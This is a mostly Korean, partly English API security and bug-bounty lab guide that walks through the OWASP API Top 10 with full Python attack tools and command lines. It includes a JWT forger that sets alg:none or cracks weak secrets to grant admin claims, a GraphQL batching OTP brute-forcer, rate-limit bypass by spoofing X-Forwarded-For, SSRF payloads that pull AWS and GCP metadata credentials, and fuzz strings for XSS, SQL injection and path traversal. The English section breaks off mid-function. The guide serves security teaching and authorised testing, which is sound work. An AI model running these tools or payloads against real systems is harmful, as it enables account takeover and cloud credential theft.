> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# API 보안 테스트 & 버그바운티 실전
> AI_Innovation_Studio | OWASP API Top 10 완전 실습 Lab

---

## 1. API 정찰 (Reconnaissance)

### OpenAPI/Swagger 명세 발견

```bash
# 공통 Swagger/OpenAPI 경로 퍼징
ffuf -u https://target.com/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/swagger.txt \
    -mc 200,301,302 \
    -fc 404 \
    -of json -o api-discovery.json

# 직접 확인할 경로 목록
/swagger.json
/swagger/v1/swagger.json
/swagger/v2/swagger.json
/api-docs
/api/v1/docs
/api/v2/docs
/openapi.json
/openapi.yaml
/openapi/v1/openapi.json
/v1/api-docs
/v2/api-docs
/v3/api-docs
/docs/api
/redoc
/scalar
/.well-known/api-catalog

# API 버전 열거 (레거시 버전 탐색)
for v in v1 v2 v3 v4 v5 v1.0 v2.0 beta alpha internal; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/api/$v/users")
    echo "$v: HTTP $code"
done
```

레거시 API 버전은 보안 패치가 적용되지 않아 최신 버전에서 수정된 취약점이 여전히 존재할 수 있다.

### JavaScript 파일에서 API 엔드포인트 추출

```bash
# LinkFinder 설치 및 실행
pip install linkfinder
python3 linkfinder.py -i https://target.com -d -o cli

# 직접 JS 파일 다운로드 후 분석
curl -s https://target.com/main.js | \
    grep -oE '(\/api\/[a-zA-Z0-9/_-]+)' | \
    sort -u

# gau로 웹 아카이브에서 JS 파일 수집
gau target.com | grep "\.js$" | httpx -status-code -content-type | grep javascript
```

### Postman Public Collections 검색

```
# 조직의 공개 Postman 컬렉션에서 API 키/엔드포인트 탈취
https://www.postman.com/search?q=target.com

# GitHub에서 API 키 유출 탐색
site:github.com "target.com" AND ("api_key" OR "Authorization: Bearer" OR "X-API-Key")

# truffleHog으로 Git 히스토리 탐색
trufflehog git https://github.com/target-org/api-service --only-verified
```

### Kiterunner로 API 라우트 퍼징

```bash
# Kiterunner 설치
go install github.com/assetnote/kiterunner@latest

# API 엔드포인트 퍼징 (REST API 특화 워드리스트)
kr scan https://target.com -w routes-large.kite -x 20 --timeout 3000

# 응답 코드 필터링
kr scan https://target.com -w routes-large.kite \
    -x 20 \
    --fail-status-codes 404,429 \
    --success-status-codes 200,201,204

# OpenAPI 스펙 기반 퍼징
kr brute https://target.com -w routes-large.kite \
    --header "Authorization: Bearer TOKEN" \
    --header "Content-Type: application/json"
```

---

## 2. OWASP API Security Top 10 (2023) 완전 실습

### API1:2023 — BOLA (Broken Object Level Authorization)

BOLA(= IDOR)는 API 버그바운티에서 가장 자주 발견되는 취약점이다. 사용자 A가 사용자 B의 리소스 ID로 직접 접근 가능한 경우 발생한다.

```http
-- 취약한 패턴
GET /api/v1/users/1234/orders        → 내 주문
GET /api/v1/users/1235/orders        → 다른 사용자 주문 (BOLA!)
GET /api/v1/documents/9999           → 다른 사용자 문서
DELETE /api/v1/accounts/5678         → 다른 계정 삭제
PUT /api/v1/profiles/abc123/email    → 다른 사용자 이메일 변경

-- 테스트: Burp Suite Autorize 확장 사용
1. 계정 A로 로그인 → Cookie/Token A 설정
2. 계정 B로 로그인 → Cookie/Token B 설정
3. Autorize: Token A의 요청에 Token B로 자동 재시도
4. 두 응답이 같은 내용이면 → BOLA 취약점
```

```python
#!/usr/bin/env python3
"""BOLA/IDOR 자동 탐지 도구 — 두 계정으로 동일 리소스 접근을 비교합니다."""

from __future__ import annotations
import argparse
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass

import httpx


@dataclass
class BOLAResult:
    endpoint: str
    resource_id: str | int
    status_victim: int
    status_attacker: int
    length_victim: int
    length_attacker: int
    vulnerable: bool


def test_bola(
    base_url: str,
    endpoint_template: str,
    resource_ids: list[int],
    victim_token: str,
    attacker_token: str,
) -> list[BOLAResult]:
    """두 토큰으로 각 리소스 ID에 접근을 시도하고 BOLA를 탐지합니다."""
    results = []

    def check_id(rid: int) -> BOLAResult:
        endpoint = endpoint_template.format(id=rid)
        full_url = f"{base_url}{endpoint}"

        with httpx.Client(verify=False, timeout=10.0) as client:
            victim_resp = client.get(
                full_url,
                headers={"Authorization": f"Bearer {victim_token}"},
            )
            attacker_resp = client.get(
                full_url,
                headers={"Authorization": f"Bearer {attacker_token}"},
            )

        # 공격자가 피해자와 동일한 응답을 받으면 BOLA
        vulnerable = (
            attacker_resp.status_code == 200
            and victim_resp.status_code == 200
            and abs(len(attacker_resp.content) - len(victim_resp.content)) < 50
        )

        return BOLAResult(
            endpoint=endpoint,
            resource_id=rid,
            status_victim=victim_resp.status_code,
            status_attacker=attacker_resp.status_code,
            length_victim=len(victim_resp.content),
            length_attacker=len(attacker_resp.content),
            vulnerable=vulnerable,
        )

    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(check_id, rid): rid for rid in resource_ids}
        for future in as_completed(futures):
            results.append(future.result())

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="BOLA/IDOR 자동 탐지 도구")
    parser.add_argument("base_url", help="기본 URL (예: https://api.target.com)")
    parser.add_argument(
        "--endpoint", default="/api/v1/users/{id}/profile",
        help="엔드포인트 템플릿 ({id}가 ID로 치환됨)"
    )
    parser.add_argument(
        "--ids", nargs="+", type=int, default=list(range(1, 21)),
        help="테스트할 ID 목록"
    )
    parser.add_argument("--victim-token", required=True, help="피해자 계정 Bearer 토큰")
    parser.add_argument("--attacker-token", required=True, help="공격자 계정 Bearer 토큰")
    args = parser.parse_args()

    print(f"[*] BOLA 테스트: {args.base_url}{args.endpoint}")
    print(f"[*] 테스트 ID: {args.ids[:5]}...")

    results = test_bola(
        args.base_url,
        args.endpoint,
        args.ids,
        args.victim_token,
        args.attacker_token,
    )

    vulnerable = [r for r in results if r.vulnerable]
    print(f"\n[+] BOLA 취약점: {len(vulnerable)}개 발견\n")
    for r in vulnerable:
        print(f"  [!] ID {r.resource_id}: 공격자 응답 {r.status_attacker} ({r.length_attacker}B)")

    print("\n[*] 전체 결과:")
    for r in sorted(results, key=lambda x: x.resource_id):
        icon = "[VULN]" if r.vulnerable else "[safe]"
        print(f"  {icon} ID {r.resource_id}: 피해자={r.status_victim}, 공격자={r.status_attacker}")


if __name__ == "__main__":
    main()
```

### API2:2023 — Broken Authentication

#### JWT 취약점 전체

```bash
# jwt_tool 설치
pip install jwt_tool

# 1. alg:none 공격 (서명 검증 완전 비활성화)
jwt_tool.py <TOKEN> -X a

# 2. 약한 시크릿 크래킹
jwt_tool.py <TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# 3. 시크릿 확인 후 조작
jwt_tool.py <TOKEN> -T -S hs256 -p "secretpassword"
# → 페이로드 수정 (role: user → admin, exp: 연장)

# 4. RS256 → HS256 혼동 공격
# RS256에서 공개키를 HMAC 시크릿으로 사용 시도
jwt_tool.py <TOKEN> -X k -pk public.pem

# 5. JWT 클레임 분석
jwt_tool.py <TOKEN> -d  # 디코딩
```

```python
#!/usr/bin/env python3
"""JWT 취약점 자동 탐지 도구 — alg:none, 약한 시크릿, 클레임 조작을 테스트합니다."""

from __future__ import annotations
import argparse
import base64
import hashlib
import hmac
import json
import sys

import httpx


def decode_jwt_part(part: str) -> dict:
    """JWT 파트를 디코딩합니다 (패딩 자동 처리)."""
    padded = part + "=" * (4 - len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(padded))


def create_jwt_none(header: dict, payload: dict) -> str:
    """alg:none JWT를 생성합니다."""
    header["alg"] = "none"
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    return f"{h}.{p}."


def sign_jwt_hs256(header: dict, payload: dict, secret: str) -> str:
    """HS256으로 JWT를 서명합니다."""
    header["alg"] = "HS256"
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    signing_input = f"{h}.{p}"
    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{signing_input}.{sig_b64}"


def test_jwt_attacks(
    token: str,
    verify_url: str,
    admin_claims: dict | None = None,
) -> None:
    """JWT 취약점을 자동으로 테스트합니다."""
    parts = token.split(".")
    if len(parts) != 3:
        print("[!] 유효하지 않은 JWT", file=sys.stderr)
        return

    header = decode_jwt_part(parts[0])
    payload = decode_jwt_part(parts[1])

    print(f"[*] 원본 알고리즘: {header.get('alg')}")
    print(f"[*] 원본 페이로드: {json.dumps(payload, ensure_ascii=False)}")

    # 조작할 페이로드
    modified_payload = {**payload}
    if admin_claims:
        modified_payload.update(admin_claims)
    # 만료 시간 10년 연장
    if "exp" in modified_payload:
        modified_payload["exp"] = modified_payload["exp"] + 315360000

    with httpx.Client(verify=False, timeout=10.0) as client:
        # 1. alg:none 공격
        none_token = create_jwt_none(dict(header), modified_payload)
        resp = client.get(
            verify_url,
            headers={"Authorization": f"Bearer {none_token}"},
        )
        if resp.status_code == 200:
            print(f"\n[VULN!] alg:none 공격 성공! → 응답 {resp.status_code}")
            print(f"        페이로드: {json.dumps(modified_payload)}")
        else:
            print(f"[safe] alg:none 공격 실패 ({resp.status_code})")

        # 2. 약한 시크릿 목록 테스트
        common_secrets = [
            "secret", "password", "123456", "admin", "key",
            "jwt_secret", "your-256-bit-secret", "changeme",
            "your-secret-key", "mysecretkey", "supersecret",
        ]
        for secret in common_secrets:
            test_token = sign_jwt_hs256(dict(header), modified_payload, secret)
            resp = client.get(
                verify_url,
                headers={"Authorization": f"Bearer {test_token}"},
            )
            if resp.status_code == 200:
                print(f"\n[VULN!] 약한 시크릿 발견: '{secret}'")
                break
        else:
            print("[safe] 일반적인 약한 시크릿 없음")


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT 취약점 자동 테스터")
    parser.add_argument("token", help="테스트할 JWT 토큰")
    parser.add_argument("verify_url", help="토큰 검증 URL (인증 필요 엔드포인트)")
    parser.add_argument(
        "--admin-claim", nargs=2, action="append", metavar=("KEY", "VALUE"),
        help="관리자 클레임 추가 (예: --admin-claim role admin)"
    )
    args = parser.parse_args()

    admin_claims = {}
    if args.admin_claim:
        for key, value in args.admin_claim:
            admin_claims[key] = value

    test_jwt_attacks(args.token, args.verify_url, admin_claims or None)


if __name__ == "__main__":
    main()
```

### API3:2023 — Mass Assignment (일괄 할당)

```http
-- 취약한 패턴: POST body에 허용되지 않은 필드 추가
POST /api/v1/users/register HTTP/1.1
Content-Type: application/json

{
    "username": "attacker",
    "password": "password123",
    "email": "attacker@evil.com",
    "role": "admin",          ← 추가 (서버가 이 필드를 필터링 안 하면 관리자!)
    "is_verified": true,      ← 이메일 인증 우회
    "credits": 99999          ← 무료 크레딧
}

-- 탐지 방법:
1. GET /api/v1/users/{id} 응답에서 모든 필드 목록 추출
2. 해당 필드를 POST/PUT 요청에 추가
3. 응답에서 값이 반영됐는지 확인

-- 도구: Arjun (파라미터 탐지)
arjun -u https://target.com/api/v1/users -m POST --json
```

### API4:2023 — Rate Limiting 우회

```bash
# Rate Limit 우회 기법

# 1. X-Forwarded-For IP 로테이션
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}\n" \
        -H "X-Forwarded-For: $((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1)).$((RANDOM%254+1))" \
        "https://target.com/api/v1/otp/verify?code=123456"
done

# 2. 대소문자 변형으로 다른 엔드포인트로 인식 유도
/api/v1/Login
/api/v1/login
/api/v1/LOGIN
/api/V1/login
/API/v1/login

# 3. 쿼리 파라미터 추가 (캐시 키 변형)
/api/v1/login?_=1
/api/v1/login?v=1
/api/v1/login?x=cache_buster

# 4. 다른 Content-Type
application/x-www-form-urlencoded → application/json → multipart/form-data
```

### API5:2023 — Broken Function Level Authorization

```http
-- HTTP 메서드 변경으로 관리자 기능 접근
GET    /api/v1/users/123     → 사용자 조회 (허용됨)
DELETE /api/v1/users/123     → 사용자 삭제 (관리자 기능, 차단?)
PATCH  /api/v1/users/123     → 부분 수정 (허용되나?)

-- OPTIONS로 허용 메서드 확인
OPTIONS /api/v1/users/123 HTTP/1.1
→ Allow: GET, PUT, DELETE, PATCH, OPTIONS  ← 예상보다 많으면 취약점

-- 버전 다운그레이드
최신: /api/v2/admin/users   → 403 Forbidden
구버전: /api/v1/admin/users  → 200 OK (구버전에 인증 없음)

-- 숨겨진 관리자 엔드포인트 탐색 (FFUF)
ffuf -u https://target.com/api/v1/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt \
    -H "Authorization: Bearer USER_TOKEN" \
    -mc 200,201 -fc 404
```

### API7:2023 — SSRF (Server Side Request Forgery)

```http
-- 취약한 패턴: URL을 파라미터로 받는 API
POST /api/v1/webhook HTTP/1.1
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}

-- AWS 메타데이터 탈취
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2Role"}
→ AccessKeyId, SecretAccessKey, Token 노출!

-- GCP 메타데이터
{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"}
→ 헤더 필요: "Metadata-Flavor: Google"

-- 내부 서비스 포트 스캔
{"url": "http://localhost:3306"}     → MySQL
{"url": "http://localhost:6379"}     → Redis
{"url": "http://localhost:27017"}    → MongoDB

-- SSRF 필터 우회
http://127.0.0.1          → 루프백
http://0x7f000001          → 127.0.0.1 (16진수)
http://0177.0.0.1          → 127.0.0.1 (8진수)
http://127.1              → 127.0.0.1 (단축)
http://[::1]              → IPv6 루프백
http://spoofed.burpcollaborator.net  → 169.254.169.254로 리졸브되는 도메인
```

---

## 3. GraphQL 심화 공격

### Schema 정찰 (Introspection)

```graphql
# 전체 스키마 덤프
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      name
      kind
      description
      fields {
        name
        type { name kind ofType { name kind } }
        args {
          name
          type { name kind }
          defaultValue
        }
      }
    }
  }
}
```

```bash
# graphw00f로 GraphQL 엔진 탐지
pip install graphw00f
graphw00f -d -t https://target.com/graphql

# clairvoyance로 Introspection 비활성화 시 스키마 추측
pip install clairvoyance
clairvoyance -t https://target.com/graphql -w /path/to/wordlist.txt
```

### Batching 공격 (Rate Limit 우회)

```json
// 단일 HTTP 요청으로 100번 OTP 시도
[
  {"query": "mutation { verifyOTP(phone: \"+1234567890\", code: \"000000\") { token } }"},
  {"query": "mutation { verifyOTP(phone: \"+1234567890\", code: \"000001\") { token } }"},
  {"query": "mutation { verifyOTP(phone: \"+1234567890\", code: \"000002\") { token } }"},
  ...100개
]
```

```python
#!/usr/bin/env python3
"""GraphQL Batching 공격으로 OTP/패스워드 브루트포스를 수행합니다."""

from __future__ import annotations
import argparse
import json

import httpx


def batch_otp_bruteforce(
    url: str,
    phone: str,
    start: int = 0,
    end: int = 9999,
    batch_size: int = 100,
    headers: dict | None = None,
) -> str | None:
    """GraphQL Batching으로 OTP를 브루트포스합니다. 성공한 OTP를 반환합니다."""
    mutation_template = (
        'mutation {{ verifyOTP(phone: "{phone}", code: "{code:06d}") {{ '
        "token status }} }}"
    )
    default_headers = {"Content-Type": "application/json"}
    if headers:
        default_headers.update(headers)

    with httpx.Client(verify=False, timeout=30.0) as client:
        for batch_start in range(start, end + 1, batch_size):
            batch_end = min(batch_start + batch_size - 1, end)
            batch = [
                {"query": mutation_template.format(phone=phone, code=code)}
                for code in range(batch_start, batch_end + 1)
            ]
            resp = client.post(url, json=batch, headers=default_headers)

            if resp.status_code != 200:
                print(f"[!] HTTP {resp.status_code} at batch {batch_start}")
                continue

            results = resp.json()
            for i, result in enumerate(results):
                code = batch_start + i
                data = result.get("data", {}).get("verifyOTP", {})
                if data.get("token"):
                    print(f"[+] OTP 성공: {code:06d} → 토큰: {data['token'][:20]}...")
                    return str(code)

            print(f"[*] 배치 {batch_start}-{batch_end}: 실패")

    return None


def main() -> None:
    parser = argparse.ArgumentParser(description="GraphQL Batching OTP 브루트포스")
    parser.add_argument("url", help="GraphQL 엔드포인트")
    parser.add_argument("phone", help="대상 전화번호")
    parser.add_argument("--start", type=int, default=0)
    parser.add_argument("--end", type=int, default=9999)
    parser.add_argument("--batch-size", type=int, default=100)
    parser.add_argument(
        "--header", nargs=2, action="append", metavar=("NAME", "VALUE"),
        help="추가 헤더 (예: --header Authorization 'Bearer TOKEN')"
    )
    args = parser.parse_args()

    extra_headers = {}
    if args.header:
        for name, value in args.header:
            extra_headers[name] = value

    result = batch_otp_bruteforce(
        args.url, args.phone,
        args.start, args.end,
        args.batch_size, extra_headers,
    )
    if not result:
        print("[!] OTP 브루트포스 실패")


if __name__ == "__main__":
    main()
```

GraphQL 배치 요청으로 단일 HTTP 요청에 100개의 OTP를 동시에 시도해 Rate Limit을 우회한다.

### GraphQL BOLA 탐지

```graphql
# ID를 직접 지정하는 쿼리로 BOLA 테스트
query {
  user(id: "다른_사용자_ID") {
    email
    phone
    payment_methods {
      card_number
      expiry
    }
  }
}

# 자신의 ID와 다른 사용자 ID로 비교
query GetAnyOrder($id: ID!) {
  order(id: $id) {
    status
    items { name price }
    user { email phone }
  }
}
```

---

## 4. API Fuzzing 실전

### FFUF로 API 파라미터 퍼징

```bash
# GET 파라미터 퍼징
ffuf -u "https://target.com/api/v1/search?FUZZ=test" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -mc 200 -fc 404 -fs 0

# POST JSON body 파라미터 퍼징
ffuf -u "https://target.com/api/v1/users" \
    -X POST \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"FUZZ": "test"}' \
    -w params.txt \
    -mc 200,201,400 -fc 422

# 중첩 파라미터 퍼징 (Mass Assignment)
ffuf -u "https://target.com/api/v1/users/123" \
    -X PATCH \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"FUZZ": "admin"}' \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -mc 200 -fc 400,422

# API 퍼징용 커스텀 페이로드 생성
cat > api_fuzz_payloads.txt << 'EOF'
null
""
0
-1
999999999
true
false
[]
{}
<script>alert(1)</script>
' OR '1'='1
../../../etc/passwd
${7*7}
{{7*7}}
EOF
```

### Arjun으로 숨겨진 파라미터 발견

```bash
# 설치
pip install arjun

# GET 파라미터 탐색
arjun -u "https://target.com/api/v1/users" -m GET

# POST JSON 파라미터 탐색
arjun -u "https://target.com/api/v1/users" -m JSON \
    -H "Authorization: Bearer TOKEN" \
    --stable --timeout 10

# 여러 엔드포인트 배치 테스트
arjun --urls endpoints.txt -m POST --json
```

---

## 5. Postman 고급 활용

### Pre-request Script로 JWT 자동 갱신

```javascript
// Pre-request Script에 추가 (Collection Level)
const tokenExpiry = pm.environment.get('token_expiry');
const now = Date.now() / 1000;

if (!tokenExpiry || now >= tokenExpiry - 60) {
    // 토큰 만료 1분 전 갱신
    pm.sendRequest({
        url: pm.environment.get('base_url') + '/api/v1/auth/refresh',
        method: 'POST',
        header: { 'Content-Type': 'application/json' },
        body: {
            mode: 'raw',
            raw: JSON.stringify({
                refresh_token: pm.environment.get('refresh_token')
            })
        }
    }, (err, res) => {
        if (!err && res.code === 200) {
            const data = res.json();
            pm.environment.set('access_token', data.access_token);
            // JWT 만료 시간 추출 (base64 디코딩)
            const payload = JSON.parse(atob(data.access_token.split('.')[1]));
            pm.environment.set('token_expiry', payload.exp);
        }
    });
}
```

### Test Script로 BOLA 자동 검증

```javascript
// Test Script: 응답에 다른 사용자 데이터가 포함되면 경고
pm.test("BOLA 검사: 응답이 내 데이터만 포함", () => {
    const myUserId = pm.environment.get('my_user_id');
    const responseData = pm.response.json();
    
    if (responseData.user_id && responseData.user_id !== myUserId) {
        pm.expect.fail(`BOLA 탐지! 응답에 다른 사용자 ID 포함: ${responseData.user_id}`);
    }
});

pm.test("응답 코드 확인", () => {
    // 자신의 리소스가 아니면 403/404여야 함
    const requestedId = pm.request.url.path[pm.request.url.path.length - 1];
    const myUserId = pm.environment.get('my_user_id');
    
    if (requestedId !== myUserId) {
        pm.expect(pm.response.code).to.be.oneOf([403, 404]);
    }
});
```

---

## 6. Python 3.10+ 종합 API 공격 자동화 도구

```python
#!/usr/bin/env python3
"""
API 보안 자동 테스트 도구 — BOLA, Mass Assignment, Rate Limit,
JWT 취약점을 자동으로 탐지하고 HTML 보고서를 생성합니다.
"""

from __future__ import annotations
import argparse
import asyncio
import json
import time
from dataclasses import dataclass, field
from enum import StrEnum
from pathlib import Path
from typing import Any

import httpx


class VulnType(StrEnum):
    BOLA = "BOLA (Broken Object Level Authorization)"
    MASS_ASSIGN = "Mass Assignment"
    RATE_LIMIT = "Rate Limit Bypass"
    JWT_NONE = "JWT alg:none"
    JWT_WEAK = "JWT Weak Secret"


@dataclass
class Finding:
    vuln_type: VulnType
    endpoint: str
    severity: str
    evidence: str
    request_sample: str = ""
    response_sample: str = ""


@dataclass
class ScanConfig:
    base_url: str
    token: str
    victim_token: str = ""
    timeout: float = 10.0
    delay: float = 0.2


async def check_rate_limit(
    config: ScanConfig,
    endpoint: str,
    attempts: int = 50,
) -> Finding | None:
    """Rate Limit 미적용 취약점을 비동기로 탐지합니다."""
    success_count = 0

    async with httpx.AsyncClient(verify=False, timeout=config.timeout) as client:
        tasks = [
            client.post(
                f"{config.base_url}{endpoint}",
                json={"code": f"{i:06d}"},
                headers={"Authorization": f"Bearer {config.token}"},
            )
            for i in range(attempts)
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

    for resp in responses:
        if isinstance(resp, Exception):
            continue
        if resp.status_code in (200, 201):
            success_count += 1

    # 50회 중 45회 이상 200 응답 → Rate Limit 없음
    if success_count >= attempts * 0.9:
        return Finding(
            vuln_type=VulnType.RATE_LIMIT,
            endpoint=endpoint,
            severity="High",
            evidence=f"{attempts}회 연속 요청 중 {success_count}회 성공 → Rate Limit 없음",
            request_sample=f"POST {endpoint} × {attempts}",
        )
    return None


def check_mass_assignment(
    config: ScanConfig,
    endpoint: str,
    extra_fields: dict[str, Any],
) -> Finding | None:
    """Mass Assignment 취약점을 탐지합니다."""
    with httpx.Client(verify=False, timeout=config.timeout) as client:
        # 먼저 정상 요청으로 기준 응답 획득
        base_resp = client.get(
            f"{config.base_url}{endpoint}",
            headers={"Authorization": f"Bearer {config.token}"},
        )

        # 추가 필드 포함해 PUT/PATCH 요청
        update_resp = client.patch(
            f"{config.base_url}{endpoint}",
            json=extra_fields,
            headers={
                "Authorization": f"Bearer {config.token}",
                "Content-Type": "application/json",
            },
        )

        if update_resp.status_code in (200, 201, 204):
            # 업데이트 후 재조회
            verify_resp = client.get(
                f"{config.base_url}{endpoint}",
                headers={"Authorization": f"Bearer {config.token}"},
            )
            verify_data = verify_resp.json() if verify_resp.status_code == 200 else {}

            for key, value in extra_fields.items():
                if str(verify_data.get(key)) == str(value):
                    return Finding(
                        vuln_type=VulnType.MASS_ASSIGN,
                        endpoint=endpoint,
                        severity="Critical",
                        evidence=f"필드 '{key}' = '{value}' 로 변경 성공",
                        request_sample=f"PATCH {endpoint}: {json.dumps(extra_fields)}",
                        response_sample=json.dumps(verify_data)[:200],
                    )
    return None


def generate_html_report(findings: list[Finding], output_path: Path) -> None:
    """HTML 형식의 보고서를 생성합니다."""
    severity_colors = {
        "Critical": "#ff0000",
        "High": "#ff6600",
        "Medium": "#ffaa00",
        "Low": "#00aa00",
    }

    rows = ""
    for f in findings:
        color = severity_colors.get(f.severity, "#888")
        rows += f"""
        <tr>
            <td style="color:{color}; font-weight:bold">{f.severity}</td>
            <td>{f.vuln_type}</td>
            <td><code>{f.endpoint}</code></td>
            <td>{f.evidence}</td>
        </tr>"""

    html = f"""<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>API 보안 테스트 보고서</title>
    <style>
        body {{ font-family: -apple-system, sans-serif; margin: 40px; }}
        h1 {{ color: #1a1a2e; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th {{ background: #16213e; color: white; padding: 10px; text-align: left; }}
        td {{ padding: 8px; border-bottom: 1px solid #ddd; }}
        tr:hover {{ background: #f5f5f5; }}
        .summary {{ background: #f8f9fa; padding: 20px; border-radius: 8px; margin-bottom: 20px; }}
    </style>
</head>
<body>
    <h1>API 보안 테스트 보고서</h1>
    <div class="summary">
        <strong>총 발견된 취약점: {len(findings)}개</strong><br>
        Critical: {sum(1 for f in findings if f.severity == 'Critical')}개 |
        High: {sum(1 for f in findings if f.severity == 'High')}개 |
        Medium: {sum(1 for f in findings if f.severity == 'Medium')}개
    </div>
    <table>
        <thead>
            <tr>
                <th>심각도</th>
                <th>취약점 유형</th>
                <th>엔드포인트</th>
                <th>증거</th>
            </tr>
        </thead>
        <tbody>{rows}</tbody>
    </table>
    <p style="color:#888; margin-top:20px; font-size:0.8em">
        생성: AI_Innovation_Studio API Security Scanner
    </p>
</body>
</html>"""

    output_path.write_text(html, encoding="utf-8")
    print(f"[*] HTML 보고서 생성: {output_path}")


def main() -> None:
    parser = argparse.ArgumentParser(description="API 보안 자동화 테스트 도구")
    parser.add_argument("base_url", help="API 기본 URL")
    parser.add_argument("--token", required=True, help="Bearer 인증 토큰")
    parser.add_argument("--victim-token", help="BOLA 테스트용 피해자 토큰")
    parser.add_argument("--endpoint", required=True, help="테스트할 API 엔드포인트")
    parser.add_argument(
        "--mass-assign-fields", nargs="+",
        default=["role=admin", "is_admin=true", "credits=99999"],
        help="Mass Assignment 테스트 필드 (key=value 형식)"
    )
    parser.add_argument("-o", "--output", type=Path, default=Path("api_report.html"))
    args = parser.parse_args()

    config = ScanConfig(
        base_url=args.base_url,
        token=args.token,
        victim_token=args.victim_token or args.token,
    )

    findings: list[Finding] = []

    print(f"[*] API 보안 스캔 시작: {args.base_url}{args.endpoint}")

    # Rate Limit 검사 (비동기)
    print("[*] Rate Limit 검사 중...")
    rl_result = asyncio.run(check_rate_limit(config, args.endpoint))
    if rl_result:
        print(f"[VULN] {rl_result.vuln_type}: {rl_result.evidence}")
        findings.append(rl_result)

    # Mass Assignment 검사
    print("[*] Mass Assignment 검사 중...")
    extra = {}
    for field_str in args.mass_assign_fields:
        if "=" in field_str:
            k, v = field_str.split("=", 1)
            extra[k] = v
    if extra:
        ma_result = check_mass_assignment(config, args.endpoint, extra)
        if ma_result:
            print(f"[VULN] {ma_result.vuln_type}: {ma_result.evidence}")
            findings.append(ma_result)

    print(f"\n[+] 스캔 완료: {len(findings)}개 취약점 발견")
    generate_html_report(findings, args.output)


if __name__ == "__main__":
    main()
```

---

## 7. API 버그바운티 보고서 작성 가이드

### 보고서 템플릿 (BOLA 예시)

```markdown
## 취약점 요약

**유형:** BOLA (Broken Object Level Authorization) / IDOR
**심각도:** High (CVSS 7.5)
**영향 범위:** 모든 사용자 계정의 주문 내역 무단 조회

---

## 설명

`GET /api/v1/users/{user_id}/orders` 엔드포인트가 `user_id` 파라미터에 대한
객체 수준 권한 검사를 수행하지 않습니다. 인증된 모든 사용자가 다른 사용자의
주문 내역을 조회할 수 있습니다.

---

## 재현 단계

1. 계정 A (attacker@evil.com)로 로그인 후 토큰 획득
2. 계정 B의 user_id 확인 (공개 프로필 등에서)
3. 계정 B의 주문 내역 조회:

\`\`\`http
GET /api/v1/users/USER_B_ID/orders HTTP/1.1
Host: api.target.com
Authorization: Bearer ACCOUNT_A_TOKEN

HTTP/1.1 200 OK
{
  "orders": [
    {"id": 12345, "product": "iPhone 15", "address": "서울시 강남구...", ...}
  ]
}
\`\`\`

---

## 영향

- 모든 사용자의 주문 내역, 배송지 주소, 결제 방법 마지막 4자리 노출
- 예상 영향 사용자 수: 10만+ (총 가입자 기준)
- GDPR 위반 가능성 (개인정보 무단 접근)

---

## 권고 사항

서버 측에서 요청한 `user_id`가 현재 인증된 사용자의 ID와 일치하는지 확인:

\`\`\`python
if order.user_id != current_user.id:
    raise PermissionDenied()
\`\`\`
```

### CVSS 점수 산정 예시

| 취약점 | Attack Vector | Complexity | Privileges | User Interaction | CVSS |
|--------|--------------|-----------|-----------|-----------------|------|
| BOLA | Network | Low | Low | None | **7.5** High |
| Mass Assignment | Network | Low | Low | None | **8.8** High |
| SSRF (AWS 메타데이터) | Network | Low | Low | None | **9.8** Critical |
| JWT alg:none | Network | Low | None | None | **9.1** Critical |
| Rate Limit OTP | Network | Low | None | None | **7.3** High |

---

<a name="english"></a>

# API Security Testing & Bug Bounty Practical Guide

> AI_Innovation_Studio | OWASP API Top 10 Complete Hands-on Lab

---

## 1. OWASP API Top 10 Overview

API security vulnerabilities differ from traditional web vulnerabilities — they focus on authentication, authorization, and business logic flaws rather than just injection attacks.

```
OWASP API Top 10 (2023):
API1  — Broken Object Level Authorization (BOLA/IDOR)
API2  — Broken Authentication
API3  — Broken Object Property Level Authorization
API4  — Unrestricted Resource Consumption
API5  — Broken Function Level Authorization
API6  — Unrestricted Access to Sensitive Business Flows
API7  — Server Side Request Forgery (SSRF)
API8  — Security Misconfiguration
API9  — Improper Inventory Management
API10 — Unsafe Consumption of APIs
```

---

## 2. API1 — BOLA (Broken Object Level Authorization)

BOLA is the most common API vulnerability — accessing other users' data by changing object IDs.

```bash
# Basic BOLA test
GET /api/v1/users/1001/profile      # Your own account
GET /api/v1/users/1002/profile      # Someone else's account ← BOLA if accessible

# BOLA in orders
GET /api/orders/ORD-2024-001        # Your order
GET /api/orders/ORD-2024-002        # Someone else's order

# BOLA test with Python
import requests

def test_bola(base_url: str, auth_token: str, user_ids: list) -> list:
